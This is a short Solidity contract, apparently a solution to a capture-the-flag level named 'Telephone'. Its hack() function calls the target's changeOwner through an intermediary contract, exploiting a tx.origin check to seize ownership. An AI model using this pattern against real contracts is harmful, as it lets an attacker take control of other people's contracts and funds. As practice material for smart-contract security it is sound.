// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "./Telephone.sol";

contract TelephoneHack {
    Telephone public immutable telephone;

    constructor(Telephone telephone_) {
        telephone = telephone_;
    }

    function hack() external {
        telephone.changeOwner(msg.sender);
    }
}
